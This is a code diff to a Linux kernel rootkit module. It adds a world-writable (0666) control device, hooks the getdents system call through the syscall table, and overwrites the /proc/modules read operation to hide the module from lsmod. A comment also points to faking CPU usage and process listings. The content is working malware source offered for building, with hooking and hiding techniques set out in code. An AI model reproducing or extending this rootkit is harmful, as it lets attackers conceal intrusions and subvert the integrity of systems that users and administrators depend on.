@@ -12,10 +12,11 @@ struct linux_dirent {
 	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
 };
 
-void hello(void) {
-	printk("Hello replaced proc read\n");
+ssize_t seq_read_fake(struct file *file, char __user *buf, size_t size, loff_t *ppos) 
+{
+	printk("Successful hook into seqread\n");
+	return orig_proc_read(file, buf, size, ppos);
 }
-
 
 //Test fakeRead
 static asmlinkage int fakegetdents(int fd, struct linux_dirent __user *dirp, unsigned int count) {
@@ -55,20 +56,54 @@ static struct file_operations file_ops
 	.release = device_release,
 };
 
+//Make dev file accessible to anyone
+static int change_privs(struct device *dev, struct kobj_uevent_env *env) {
+	add_uevent_var(env, "DEVMODE=%#o", 0666);
+	return 0;
+}
+
 static int __init rootkit_load(void)
 {
 	printk(KERN_INFO "Attempting to load rootkit\n");
-	major_number = register_chrdev(0, DEVICE_NAME, &file_ops); 
-
-	if(major_number < 0) {
-		printk("Registering the RTKT module failed with %d.\n", major_number);
-		return major_number;
+	//major_number = register_chrdev(0, DEVICE_NAME, &file_ops); 
+	
+	if ((init_val = alloc_chrdev_region(&first_dev_num, 0, 1, DEVICE_NAME)) < 0) {
+		printk(KERN_ALERT "Error registering chrdev_region\n");
+		return -1;
 	}
 
+	//Create class so we can auto instantiante chardev later
+	if((cl = class_create(THIS_MODULE, "chardev")) == NULL) {
+		printk(KERN_ALERT "Could not create class");
+		unregister_chrdev_region(first_dev_num, 1);
+		return -1;
+	}
+
+	cl->dev_uevent = change_privs;
+
+	if (device_create(cl, NULL, first_dev_num, NULL, DEVICE_NAME) == NULL) {
+		printk(KERN_ALERT "Could not create class associated with chrdev\n");
+		class_destroy(cl);
+		return -1;
+	}
+
+	cdev_init(&root_kit, &file_ops); //specify RWO
+
+	//Add to devfs
+	if(cdev_add(&root_kit, first_dev_num, 1) == -1) {
+		printk(KERN_ALERT "Could not create device file\n");
+		return -1;
+	}
+
+	//if(major_number < 0) {
+	//	printk("Registering the RTKT module failed with %d.\n", major_number);
+	//	return major_number;
+	//}
+
 	//Print vfs chr dev info
-	printk("Assigned major number: %d\n", major_number);
-	printk("Run: mknod /dev/rootkit-test c %d 0 \n", major_number);
-	printk("Remove the device file when done\n");
+	//printk("Assigned major number: %d\n", major_number);
+	//printk("Run: mknod /dev/rootkit-test c %d 0 \n", major_number);
+	//printk("Remove the device file when done\n");
 
 	return 0;
 }
@@ -224,19 +259,20 @@ static ssize_t device_write(struct file *filp,
 				printk("Could not find address of sys_call_table\n");
 				return write_bytes;
 			}
+			//Hide module from lsmod via proc fs ops... basically just seq_read?
 			if(proc_ops == NULL) {
 				printk("Could not find address of proc_modules_operations\n");
 				return write_bytes;
 			}
 
-			//save old read
+			//save old read operation
 			orig_getdents = (typeof(sys_getdents) *)syscall_table[__NR_getdents];
 			CRO_WRITE_UNLOCK({ syscall_table[__NR_getdents] = (void *)&fakegetdents; });
 
 			//save old proc_modules_operations->read
 			orig_proc_read = (typeof(seq_read) *) proc_ops->read;
 			//replace read with own version
-
+			CRO_WRITE_UNLOCK({ proc_ops->read = (void *)&seq_read_fake; });
 			break;
 			}
 		case 4: //Fake CPU usage and programs running 
